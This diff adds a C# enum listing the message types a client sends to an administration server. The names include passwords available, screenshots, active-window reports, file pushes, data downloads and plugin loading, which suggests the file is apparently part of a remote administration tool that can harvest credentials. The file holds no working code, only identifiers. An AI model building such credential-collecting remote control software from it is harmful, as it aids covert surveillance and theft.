@@ -1,0 +1,44 @@
+﻿namespace Orcus.Shared.Communication
+{
+    public enum FromClientPackage
+    {
+        ResponseToAdministration,
+        ResponseToAdministrationCompressed,
+        ServerPackage,
+        ResponseLoginOpen,
+        NewClientConnected,
+        ClientConnected,
+        ClientDisconnected,
+        ComputerInformationAvailable,
+        PasswordsAvailable,
+        GroupChanged,
+        ClientsRemoved,
+        PLACEHOLDER, //oncleanup
+        SubmitExceptions,
+        ResponseStaticCommandResult,
+        DynamicCommands,
+        DynamicCommandsRemoved,
+        PluginLoaded,
+        PluginLoadFailed,
+        DataTransferProtocolResponse,
+        ResponseActiveWindow,
+        ResponseScreenshot,
+        InitializePushFile,
+        PushHeader,
+        PushFileData,
+        DataRemoved,
+        PasswordsRemoved,
+        DataDownloadPackage,
+        StillAlive,
+        StaticCommandPluginReceived,
+        StaticCommandPluginTransmissionFailed,
+        RequestStaticCommandPlugin,
+        DynamicCommandAdded,
+        DynamicCommandEventsAdded,
+        DynamicCommandStatusUpdate,
+        ResponseLibraryInformation,
+        ResponseLibraryLoadingResult,
+        CheckStillAlive,
+        ActiveCommandsChanged
+    }
+}
